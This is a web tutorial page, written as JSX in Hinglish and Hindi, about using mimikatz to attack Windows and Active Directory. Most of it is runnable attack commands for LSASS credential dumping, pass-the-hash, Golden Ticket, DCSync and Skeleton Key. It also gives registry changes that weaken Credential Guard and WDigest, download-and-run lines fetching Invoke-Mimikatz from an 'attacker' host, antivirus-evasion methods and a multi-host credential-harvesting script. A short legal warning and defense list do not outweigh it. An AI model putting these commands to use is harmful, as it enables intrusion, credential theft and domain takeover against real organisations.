import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Mimikatz() {
  return (
    <TutorialLayout
      title="mimikatz"
      subtitle="Windows credential extraction — memory se passwords nikalne ka king"
      icon="🔑"
      prev={{ to: '/tool/dnsrecon', label: 'dnsrecon' }}
      next={{ to: '/tool/bloodhound', label: 'bloodhound' }}
    >
      <h2>What is Mimikatz?</h2>
      <p>
        Mimikatz Windows security ka sabse famous tool hai jo credential extraction ke liye banaya gaya hai. Yeh tool Windows ke LSASS (Local Security Authority Subsystem Service) process se passwords, hashes, Kerberos tickets, aur certificates extract kar sakta hai. Benjamin Delpy (gentilkiwi) ne 2007 mein isko banaya tha aur aaj yeh har penetration tester aur red teamer ke toolkit mein hota hai.
      </p>
      <p>
        Mimikatz ka sabse bada contribution hai "Pass-the-Hash" attack ko popular karna. Pehle log sochte the ki agar password hash hai toh kuch nahi ho sakta — lekin Mimikatz ne prove kiya ki hash se bhi authentication ho sakti hai bina password jaane. Isne Windows security landscape ko poora badal diya. Microsoft ne kai security updates sirf Mimikatz ki wajah se release kiye hain.
      </p>
      <p>
        Mimikatz C mein likha gaya hai aur yeh Windows API ka direct use karta hai — specifically LSA (Local Security Authority) functions. Yeh tool kisi bhi Windows version par kaam kar sakta hai — Windows 7, 8, 10, 11, Server 2008, 2012, 2016, 2019, 2022. Isme bahut saare modules hain jo alag-alag tarah ke attacks perform karte hain — credential dumping, token manipulation, certificate theft, Kerberos attacks.
      </p>
      <p>
        Mimikatz ka naam "mimi" aur "katz" se bana hai — yeh ek playful naam hai lekin iska kaam bahut serious hai. Yeh tool ek security researcher ka best friend hai kyunki yeh Windows ki internal security mechanisms ko expose karta hai. Defensive teams bhi iska use karti hain apne environment ko test karne ke liye — agar Mimikatz credentials nikaal sakta hai toh attacker bhi nikaal sakta hai.
      </p>
      <p>
        Mimikatz open source hai aur GitHub par available hai. Iska community support bahut strong hai — regular updates aate hain naye Windows versions ke liye. Kali Linux, Parrot OS, aur bahut saari security distributions mein yeh pre-installed aata hai. Agar nahi hai toh source code se compile kar sakte ho ya pre-compiled binary use kar sakte ho.
      </p>
      <p>
        Mimikatz ka architecture modular hai — har module ek specific attack type handle karta hai. sekurlsa module credentials dump karta hai, kerberos module ticket attacks karta hai, crypto module certificates handle karta hai, dpapi module encrypted data decrypt karta hai, aur misc module special attacks jaise Skeleton Key implement karta hai. Is modular design ki wajah se naye attacks add karna aasan hota hai.
      </p>
      <p>
        Red team engagements mein Mimikatz kaafi crucial role play karta hai. Initial access milne ke baad credential extraction se lateral movement hota hai — ek compromised machine se doosre machines tak pahunchne ka raasta ban jata hai. BloodHound, CrackMapExec, aur Impacket jaise tools ke saath milkar Mimikatz ek complete attack chain build karta hai. MITRE ATT&CK framework mein Mimikatz ke techniques T1003 (OS Credential Dumping), T1558 (Steal or Forge Kerberos Tickets), aur T1134 (Access Token Manipulation) ke under classify hote hain.
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Mimikatz केवल अधिकृत Red Team operations और security testing में ही use करें। बिना अनुमति के credential extraction illegal है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized access अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। Mimikatz का possession भी suspicious हो सकता है — केवल authorized environment में use करें।
      </div>

      <h2>History of Mimikatz</h2>
      <p>
        Mimikatz की शुरुआत 2007 में हुई जब Benjamin Delpy (gentilkiwi) ने Windows authentication mechanism को study करना शुरू किया। Benjamin एक French security researcher हैं जो Windows internals में deeply interested थे। उन्होंने discover किया कि Windows plaintext passwords को memory में store करता है — LSASS process के अंदर। यह एक fundamental design flaw था।
      </p>
      <p>
        2011 में Benjamin ने Pass-the-Hash technique को demonstrate किया — यह technique किसी को password जाने बिना authenticate करने देती है। इसने security industry में तहलका मचा दिया। Microsoft ने 2012 में कुछ mitigations release कीं लेकिन Mimikatz ने हर mitigation को bypass करने का तरीका ढूंढ लिया। 2014 में Mimikatz ने Credential Guard bypass कर दिया — Microsoft का "unbreakable" protection।
      </p>
      <p>
        Mimikatz ने कई Windows security features को expose किया — WDigest authentication (plaintext passwords), Kerberos delegation abuse, token manipulation, और certificate theft। हर बार जब Microsoft कोई security fix release करता था, Benjamin Mimikatz में नया module add कर देता था। यह cat-and-mouse game आज भी चल रही है। Mimikatz ने Windows security को fundamentally बदल दिया है।
      </p>
      <p>
        2015 में Microsoft ने Credential Guard introduce किया — hardware-based virtualization se LSASS ko protect karne ka attempt. Lekin Benjamin ne jaldi hi bypass nikal liya. 2016 mein Windows 10 ke saath Microsoft ne WDigest default disable kar diya — plaintext passwords ab directly nahi milte the, lekin registry key change se wapas enable ho sakta tha. 2017 mein Microsoft ne LSA Protection (RunAsPPL) ko improve kiya lekin Mimikatz ne phir bhi tareeke dhundh liye.
      </p>
      <p>
        2018-2020 ke beech Mimikatz ne kai naye techniques add kiye — DPAPI module expanded hua, certificate theft capabilities improve hui, aur naye Kerberos attack vectors add hue. COVID-19 ke dauraan remote work badha toh Mimikatz ka use bhi badha — attackers remote access ke baad credential extraction ke liye Mimikatz use karte the. Red teams ne Mimikatz ko apne standard toolkit mein include kiya. Aaj Mimikatz 40+ modules ke saath Windows ka sabse comprehensive credential extraction tool hai.
      </p>

      <h2>How Mimikatz Works?</h2>
      <p>
        Mimikatz Windows ke internal APIs ka direct use karta hai — specifically LSA (Local Security Authority) functions. Yeh LSASS process ke memory se credentials extract karta hai jo Windows authentication ke liye store karti hai.
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">LSASS Memory Access:</strong> Windows ke LSASS process mein sab credentials store hote hain — Mimikatz directly memory read kar sakta hai</li>
        <li><strong className="text-white">SSP (Security Support Provider):</strong> Windows authentication packages ko hook karke plaintext passwords capture karta hai</li>
        <li><strong className="text-white">WDigest Abuse:</strong> WDigest authentication plaintext passwords store karti hai — Mimikatz directly extract kar sakta hai</li>
        <li><strong className="text-white">Kerberos Ticket Extraction:</strong> Kerberos tickets memory se nikalta hai — Golden Ticket attack possible hota hai</li>
        <li><strong className="text-white">Token Manipulation:</strong> Windows access tokens manipulate karke privilege escalation karta hai</li>
        <li><strong className="text-white">DPAPI Decryption:</strong> Windows Data Protection API se encrypted data decrypt kar sakta hai</li>
        <li><strong className="text-white">Certificate Theft:</strong> Private keys aur certificates extract kar sakta hai</li>
        <li><strong className="text-white">DCSync Attack:</strong> Domain Controller se directly password hashes pull kar sakta hai bina DC par kuch kiye</li>
      </ul>

      <h2>Installation</h2>
      <CodeBlock
        title="Mimikatz Installation — Kali Linux"
        code={`# Kali Linux mein pre-installed:
sudo apt update
sudo apt install mimikatz

# Agar nahi hai toh:
sudo apt install mimikatz

# Version check:
mimikatz --version

# Direct run:
mimikatz.exe`}
      />
      <CodeBlock
        title="Mimikatz Installation — Windows (Source se Compile)"
        code={`# GitHub se source download:
git clone https://github.com/gentilkiwi/mimikatz.git
cd mimikatz

# Visual Studio 2019/2022 chahiye
# kiali.sln open karo Visual Studio mein

# Build configuration select karo:
# - x64 (64-bit systems ke liye)
# - x86 (32-bit systems ke liye)
# - Release mode mein build karo

# Build karo: Build → Build Solution (Ctrl+Shift+B)
# Output: mimikatz/x64/Release/mimikatz.exe

# Pre-compiled binary download:
# https://github.com/gentilkiwi/mimikatz/releases
# mimikatz_trunk.zip download karo
# Extract karo aur directly run karo`}
      />
      <CodeBlock
        title="Mimikatz Installation — PowerShell / Remote"
        code={`# PowerShell Invoke-Mimikatz (Empire framework):
IEX (New-Object Net.WebClient).DownloadString(
  'http://attacker/Invoke-Mimikatz.ps1'
)
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Cobalt Strike beacon:
beacon> mimikatz sekurlsa::logonpasswords
beacon> mimikatz lsadump::sam
beacon> mimikatz !sekurlsa::logonpasswords

# CrackMapExec se remote:
crackmapexec smb 192.168.1.0/24 -u admin -p pass --sam
crackmapexec smb 192.168.1.0/24 -u admin -p pass --lsa

# Important: Antivirus detect karega!
# Real engagement mein AMSI bypass ya obfuscation chahiye`}
      />

      <h2>Basic Usage</h2>
      <CodeBlock
        title="Mimikatz Basic Commands"
        code={`# Mimikatz start karo (admin privileges chahiye):
mimikatz.exe

# Privilege debug mode enable karo:
privilege::debug

# Sab credentials dump karo:
sekurlsa::logonpasswords

# SAM database se hashes:
lsadump::sam

# Current user ka token:
token::elevate

# Kerberos tickets:
kerberos::list

# Exit:
exit`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Module</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">privilege::debug</td><td className="py-2 px-3">Debug privileges enable — required for most attacks</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">sekurlsa::logonpasswords</td><td className="py-2 px-3">LSASS se sab credentials dump — sabse important</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">sekurlsa::wdigest</td><td className="py-2 px-3">WDigest plaintext passwords</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">lsadump::sam</td><td className="py-2 px-3">SAM database se local account hashes</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">lsadump::dcsync</td><td className="py-2 px-3">DC se directly hashes pull — bahut powerful</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">kerberos::golden</td><td className="py-2 px-3">Golden Ticket create — unlimited domain access</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">kerberos::ptt</td><td className="py-2 px-3">Pass-the-Ticket — ticket inject karo</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">token::elevate</td><td className="py-2 px-3">SYSTEM token acquire karo</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">crypto::capi</td><td className="py-2 px-3">Certificate private keys extract</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">misc::skeleton</td><td className="py-2 px-3">Skeleton Key inject — sab passwords kaam karenge</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Credential Dumping</h2>
      <p>
        Mimikatz ka sabse common use hai credentials dump karna — LSASS memory se passwords, hashes, aur tickets nikalna.
      </p>
      <CodeBlock
        title="Credential Dumping Commands"
        code={`# Sab credentials ek saath:
privilege::debug
sekurlsa::logonpasswords

# Output mein dikhega:
# - Username
# - Domain
# - NTLM Hash
# - SHA1 Hash
# - Plaintext Password (agar WDigest enabled hai)
# - Kerberos tickets

# Sirf WDigest passwords:
sekurlsa::wdigest

# Kerberos tickets:
sekurlsa::kerberos

# NTLM hashes:
sekurlsa::msv

# SAM database dump:
token::elevate
lsadump::sam

# System se hashes:
# SAM file: C:\\Windows\\System32\\config\\SAM
# SYSTEM file: C:\\Windows\\System32\\config\\SYSTEM`}
      />

      <h2>Pass-the-Hash</h2>
      <p>
        Pass-the-Hash (PtH) Mimikatz ki sabse famous technique hai — password ke bajay NTLM hash se authenticate karo.
      </p>
      <CodeBlock
        title="Pass-the-Hash"
        code={`# Pehle hash nikalo:
sekurlsa::logonpasswords
# NTLM Hash copy karo: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

# Pass-the-Hash se command run karo:
sekurlsa::pth /user:Administrator /domain:target.local /ntlm:e0fb1fb85756c24235ff238cbe81fe00

# Remote system par command:
sekurlsa::pth /user:Administrator /domain:target.local /ntlm:HASH /run:cmd.exe

# Impacket se bhi kar sakte ho:
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@target.com`}
      />

      <h2>Kerberos Attacks</h2>
      <CodeBlock
        title="Golden Ticket Attack"
        code={`# Golden Ticket — unlimited domain access:
# Pehle krbtgt hash nikalo (Domain Admin chahiye):
lsadump::dcsync /user:krbtgt /domain:target.local

# Golden Ticket create karo:
kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:HASH /id:500

# Ticket inject karo:
kerberos::ptt ticket.kirbi

# Ab kisi bhi service par access hai!

# Silver Ticket — specific service ke liye:
kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /target:server.target.local /service:cifs /rc4:HASH

# Pass-the-Ticket:
# Existing ticket memory se nikalo:
kerberos::list
# Inject karo:
kerberos::ptt ticket.kirbi`}
      />

      <h2>Token Manipulation</h2>
      <CodeBlock
        title="Token Manipulation"
        code={`# SYSTEM token acquire karo:
token::elevate

# Current token dekho:
token::whoami

# Specific user ka token impersonate:
token::list  # Sab available tokens
token::revert  # Original token pe wapas

# Process token steal karo:
# Pehle target process ka PID nikalo
privilege::debug
token::elevate /domainadmin`}
      />

      <h2>LSADUMP Module</h2>
      <CodeBlock
        title="LSADUMP Commands"
        code={`# SAM database dump:
lsadump::sam

# SAM + SYSTEM files se offline dump:
lsadump::sam /system:C:\\Windows\\System32\\config\\SYSTEM /sam:C:\\Windows\\System32\\config\\SAM

# LSA secrets:
lsadump::secrets

# Domain credentials (cached):
lsadump::cache

# DCSync — Domain Controller se hashes:
lsadump::dcsync /user:Administrator /domain:target.local

# Sab users ke hashes:
lsadump::dcsync /allusers /domain:target.local

# krbtgt hash (Golden Ticket ke liye):
lsadump::dcsync /user:krbtgt /domain:target.local`}
      />

      <h2>Crypto Module</h2>
      <CodeBlock
        title="Crypto Operations"
        code={`# Certificate private keys extract:
crypto::capi

# CryptoAPI patch:
crypto::capi /export

# PKCS12 certificates export:
crypto::cng

# SSL/TLS certificates:
# IIS, RDP certificates extract kar sakte ho
# Encrypted files bhi decrypt ho sakte hain`}
      />

      <h2>DPAPI Module</h2>
      <CodeBlock
        title="DPAPI Operations"
        code={`# DPAPI master keys:
dpapi::masterkey /in:C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Protect\\...\\MasterKey

# Credentials decrypt:
dpapi::cred /in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\...

# Chrome saved passwords:
# Chrome DPAPI protected passwords extract

# Wi-Fi passwords:
# netsh wlan show profile name=NetworkName key=clear
# Ya DPAPI se decrypt karo`}
      />

      <h2>Credential Guard Bypass</h2>
      <p>
        Credential Guard Microsoft ka strongest defense mechanism hai Mimikatz ke against. Yeh VBS (Virtualization-Based Security) use karta hai.
      </p>
      <p>
        Windows 10 Enterprise aur Server 2016+ mein Credential Guard LSASS ko hardware-based virtualization se protect karta hai. Lekin Mimikatz ke paas isko bypass karne ke tareeke hain — registry manipulation, SSP injection, aur kernel-level techniques se.
      </p>
      <CodeBlock
        title="Credential Guard Bypass Techniques"
        code={`# Credential Guard status check:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard

# Method 1: Disable via registry (requires SYSTEM):
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v LsaCfgFlags /t REG_DWORD /d 0 /f

# Method 2: SSP injection se plaintext capture:
# Custom SSP DLL create karo aur LSA mein load karo
# Plaintext passwords capture honge CG ke baad bhi

# Method 3: LSASS dump + offline extraction:
# Procdump use karo (SysInternals):
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Offline mimikatz se extract:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Method 4: Kernel-level access:
# Vulnerable driver load karo (BYOVD technique)
# LSASS memory directly read karo

# Method 5: NTLM relay se hash capture:
# Responder + ntlmrelayx combo
# Network se hash capture karo bina LSASS touch kiye`}
      />
      <CodeBlock
        title="WDigest Enable for Plaintext Passwords"
        code={`# WDigest registry enable (plaintext passwords ke liye):
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# User ko re-login karwao — tab password memory mein aayega
# Phir Mimikatz se dump:
sekurlsa::wdigest

# PowerShell se remotely:
Invoke-Command -ComputerName target -ScriptBlock {
    Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" -Name "UseLogonCredential" -Value 1
}

# Disable karna ho toh:
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f`}
      />

      <h2>Skeleton Key Attack</h2>
      <p>
        Skeleton Key attack mein Mimikatz Domain Controller ke LSASS process mein ek secret password inject kar deta hai — "mimikatz". Iske baad kisi bhi account par is password se login ho sakta hai bina original password jaane. Yeh bahut stealthy attack hai kyunki existing passwords kaam karte rehte hain.
      </p>
      <CodeBlock
        title="Skeleton Key Attack"
        code={`# Domain Admin se DC par:
privilege::debug
misc::skeleton

# Ab kisi bhi domain account par login:
# Username: Administrator
# Password: mimikatz
# (Original password bhi kaam karega)

# Remote access ke liye:
# \\\\dc01\\C$ net use /user:target\\Administrator mimikatz

# Limitations:
# - Sirf NTLM authentication par kaam karta hai
# - Kerberos authentication par nahi kaam karta
# - DC reboot hone par hat jata hai
# - Memory mein rehta hai — DC restart se persist nahi hota

# Detection:
# - Event ID 4673 (Special Privilege Logon)
# - LSASS memory mein unexpected SSP module
# - Network traffic anomaly`}
      />

      <h2>Lateral Movement with Mimikatz</h2>
      <p>
        Credential extraction ke baad next step hai lateral movement — compromised machine se doosri machines tak pahunchana. Mimikatz se nikale gaye hashes aur tickets se network mein spread karna possible hai.
      </p>
      <CodeBlock
        title="Lateral Movement Techniques"
        code={`# Method 1: Pass-the-Hash se remote command:
# Mimikatz se hash nikalo, phir Impacket se execute:
sekurlsa::logonpasswords
# Hash copy karo

# Impacket se:
psexec.py -hashes 00000000000000000000000000000000:e0fb1fb85756c24235ff238cbe81fe00 Administrator@192.168.1.100

# Method 2: Pass-the-Ticket se Kerberos access:
kerberos::list
kerberos::ptt ticket.kirbi
# Ab network service par access hai

# Method 3: Over-Pass-the-Hash (Rubeus combo):
sekurlsa::pth /user:admin /domain:target.local /ntlm:HASH /run:powershell.exe
# PowerShell session mein jaake Rubeus use karo:
Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# Method 4: CrackMapExec combo:
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'e0fb1fb85756c24235ff238cbe81fe00' -x "whoami"

# Method 5: WMI remote execution:
wmic /node:192.168.1.100 /user:Administrator /password:mimikatz process call create "cmd.exe /c whoami > C:\\temp\\out.txt"`}
      />

      <h2>DPAPI Credential Extraction</h2>
      <p>
        DPAPI (Data Protection API) Windows ka built-in encryption system hai jo browsers, Wi-Fi passwords, aur saved credentials ko protect karta hai. Mimikatz DPAPI module se in encrypted credentials ko decrypt kar sakta hai.
      </p>
      <CodeBlock
        title="DPAPI Deep Dive"
        code={`# Master key extract karo:
# User profile path se:
dpapi::masterkey /in:"C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-...\\MasterKey" /password:victim_password

# Bina password ke (SYSTEM context mein):
dpapi::masterkey /in:"C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-...\\MasterKey" /rpc

# Credentials decrypt:
dpapi::cred /in:"C:\\Users\\victim\\AppData\\Local\\Microsoft\\Credentials\\CRED_FILE"

# Chrome passwords extract:
# Chrome Login Data file read karo
# DPAPI protected blobs decrypt karo

# Vault credentials:
vault::list
vault::cred /in:"C:\\Users\\victim\\AppData\\Local\\Microsoft\\Vault\\..."

# Wi-Fi passwords:
# netsh wlan show profiles
# DPAPI se decrypt karo each profile ke liye`}
      />

      <h2>Mimikatz vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Mimikatz</th>
              <th className="text-left py-2 px-3 text-neon-green">CrackMapExec</th>
              <th className="text-left py-2 px-3 text-neon-green">Impacket</th>
              <th className="text-left py-2 px-3 text-neon-green">Rubeus</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Platform</td><td className="py-2 px-3">Windows native</td><td className="py-2 px-3">Python</td><td className="py-2 px-3">Python</td><td className="py-2 px-3">C#</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Credential Dump</td><td className="py-2 px-3">Best (all methods)</td><td className="py-2 px-3">Good</td><td className="py-2 px-3">Good (remote)</td><td className="py-2 px-3">Kerberos only</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Pass-the-Hash</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ (network)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Kerberos Attacks</td><td className="py-2 px-3">Golden/Silver Ticket</td><td className="py-2 px-3">Kerberoast</td><td className="py-2 px-3">Kerberoast/AS-REP</td><td className="py-2 px-3">Best (all Kerberos)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Remote Execution</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">हाँ (SMB/WMI)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">AV Evasion</td><td className="py-2 px-3">मुश्किल (flagged)</td><td className="py-2 px-3">Easy (Python)</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Medium</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">Easy (interactive)</td><td className="py-2 px-3">Easy (CLI)</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Medium</td></tr>
            <tr><td className="py-2 px-3 text-white">Best For</td><td className="py-2 px-3">Local credential dump</td><td className="py-2 px-3">Network lateral movement</td><td className="py-2 px-3">Remote exploitation</td><td className="py-2 px-3">Kerberos attacks</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Integration with Other Tools</h2>
      <p>
        Mimikatz akela sufficient nahi hai — complete attack chain ke liye doosre tools ke saath integrate karna padta hai. BloodHound se Active Directory map karo, CrackMapExec se lateral movement karo, Impacket se remote exploitation karo, aur Rubeus se Kerberos attacks karo.
      </p>
      <CodeBlock
        title="Mimikatz + BloodHound + CrackMapExec Workflow"
        code={`# Step 1: BloodHound se AD map karo
# SharpHound collector run karo compromised machine par:
SharpHound.exe -c All --zipfilename ad_data.zip

# Step 2: BloodHound mein import karo
# Neo4j start karo:
sudo neo4j start
# BloodHound open karo aur zip import karo
# Shortest Path to Domain Admin dekho

# Step 3: Mimikatz se credentials dump karo
privilege::debug
sekurlsa::logonpasswords
# Hashes aur tickets collect karo

# Step 4: CrackMapExec se network spread karo
crackmapexec smb 192.168.1.0/24 -u admin -H 'HASH' --sam
crackmapexec smb 192.168.1.0/24 -u admin -H 'HASH' --lsa

# Step 5: Impacket se remote execution
psexec.py -hashes 00:HASH Administrator@target
wmiexec.py -hashes 00:HASH Administrator@target
secretsdump.py -hashes 00:HASH Administrator@target

# Step 6: Rubeus se Kerberos attacks
Rubeus.exe kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="PowerShell Invoke-Mimikatz"
        code={`# PowerShell se Mimikatz (AV bypass ke liye):
# Invoke-Mimikatz -PowerShellEmpire se
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Cobalt Strike se:
# beacon> mimikatz sekurlsa::logonpasswords
# beacon> mimikatz lsadump::sam

# Empire module:
# usemodule credentials/mimikatz/logonpasswords

# Batch script se:
echo privilege::debug > commands.txt
echo sekurlsa::logonpasswords >> commands.txt
mimikatz.exe < commands.txt > output.txt`}
      />
      <CodeBlock
        title="Automated Credential Harvesting Script"
        code={`#!/usr/bin/env python3
# Automated Mimikatz deployment aur output parsing
# CrackMapExec + Mimikatz combo

import subprocess
import json
import re

targets = ["192.168.1.100", "192.168.1.101", "192.168.1.102"]
username = "Administrator"
ntlm_hash = "e0fb1fb85756c24235ff238cbe81fe00"

credentials = []

for target in targets:
    # CrackMapExec se SAM dump
    cmd = f"crackmapexec smb {target} -u {username} -H '{ntlm_hash}' --sam"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    for line in result.stdout.split("\\n"):
        if ":::" in line:
            parts = line.split(":")
            if len(parts) >= 4:
                credentials.append({
                    "target": target,
                    "user": parts[0],
                    "rid": parts[1],
                    "lm_hash": parts[2],
                    "ntlm_hash": parts[3]
                })

# Results save karo
with open("credentials.json", "w") as f:
    json.dump(credentials, f, indent=2)

print(f"[+] Found {len(credentials)} credential sets")`}
      />

      <h2>AV Evasion Techniques</h2>
      <p>
        Mimikatz sabse zyada flagged tool hai — har antivirus isko detect karta hai. Real engagements mein AV bypass zaruri hai. Koi bhi technique 100% reliable nahi hai — continuously update karna padta hai.
      </p>
      <CodeBlock
        title="AV Evasion Methods"
        code={`# Method 1: In-memory execution (PowerShell)
# Mimikatz ko disk pe mat likho
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')

# Method 2: Cobalt Strike reflective loading
# Beacon mein Mimikatz execute karo — fileless
beacon> mimikatz sekurlsa::logonpasswords

# Method 3: Obfuscation tools use karo
# Invoke-Obfuscation se PowerShell obfuscate karo
# Chimera framework use karo
# Mimikatz source code modify karo (string changes)

# Method 4: Native API calls se custom loader
# C# mein Direct System Calls use karo
# SysWhispers se syscall stubs generate karo

# Method 5: DLL sideloading
# Legitimate signed DLL ke saath Mimikatz DLL load karo
# Search order abuse karo

# Method 6: Procdump + offline extraction
# Procdump (signed Microsoft tool) se LSASS dump karo
procdump.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp
# Dump ko attacker machine pe laake offline extract:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords`}
      />

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Privilege debug error aa raha hai', a: 'Admin privileges chahiye. Right-click → Run as Administrator se run karo. Ya SYSTEM token pehle acquire karo.' },
          { q: 'Antivirus Mimikatz delete kar raha hai', a: 'AV signatures Mimikatz ko detect karti hain. AMSI bypass, obfuscation, ya memory injection techniques use karo. Cobalt Strike/Empire se bhi run kar sakte ho.' },
          { q: 'Plaintext passwords nahi aa rahe', a: 'WDigest disable ho sakta hai (Windows 8.1+). UseLogonCredential registry key set karo ya sekurlsa::wdigest try karo.' },
          { q: 'DCSync permission denied', a: 'Domain Admin ya DS-Replication-Get-Changes-All permission chahiye. Pehle privilege escalation karo.' },
          { q: 'LSASS access denied', a: 'Run as Administrator karo. Credential Guard enabled ho sakta hai — check karo: Get-CimInstance -ClassName Win32_DeviceGuard' },
          { q: 'Mimikatz outdated hai', a: 'Latest version download karo GitHub se. Naye Windows versions ke liye updates zaruri hain.' },
          { q: 'Golden Ticket kaam nahi kar raha', a: 'SID, krbtgt hash, aur domain name sab sahi hone chahiye. SID Get-ADDomain se nikalo.' },
          { q: 'Remote dump kaise karun?', a: 'Mimikatz locally run karna padta hai. CrackMapExec ya Impacket se remote dump kar sakte ho.' },
          { q: 'LSASS dump file bahut bada hai', a: 'Normal hai — LSASS ka dump 50MB-500MB ho sakta hai. Compress karo pehle, phir transfer karo.' },
          { q: 'Skeleton Key persist nahi hota', a: 'DC reboot hone par hat jata hai. Startup script ya scheduled task se re-apply karo. Lekin detection risk badhta hai.' },
          { q: 'SSP injection se kya fayda?', a: 'Custom SSP DLL LSASS mein load karne se sab future logins ke plaintext passwords capture hote hain — persistent credential harvesting without touching LSASS memory repeatedly.' },
          { q: 'Mimikatz ka output kaise organize karo?', a: 'File mein redirect karo: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt. PowerShell se parse karo aur CSV export karo structured reporting ke liye.' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Mimikatz detection bahut important hai — yeh tool attackers ka favorite hai.
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Credential Guard Enable:</strong> Windows Credential Guard LSASS ko protect karta hai — hardware-based security</li>
        <li><strong className="text-white">LSA Protection:</strong> RunAsPPL registry key enable karo — LSASS memory access block hota hai</li>
        <li><strong className="text-white">WDigest Disable:</strong> UseLogonCredential = 0 set karo — plaintext passwords store nahi honge</li>
        <li><strong className="text-white">Protected Users Group:</strong> Sensitive accounts ko Protected Users group mein daalo</li>
        <li><strong className="text-white">SIEM Monitoring:</strong> LSASS access, privilege::debug, aur suspicious API calls monitor karo</li>
        <li><strong className="text-white">Microsoft Defender ATP:</strong> Credential dumping detect kar sakta hai</li>
        <li><strong className="text-white">Event Log Monitoring:</strong> Event ID 4624, 4672, 4648 — suspicious logons detect karo</li>
        <li><strong className="text-white">Just-In-Time Admin:</strong> Admin access sirf zarurat par do — permanent nahi</li>
        <li><strong className="text-white">LAPS (Local Admin Password Solution):</strong> Har machine ka local admin password alag — PtH prevent hota hai</li>
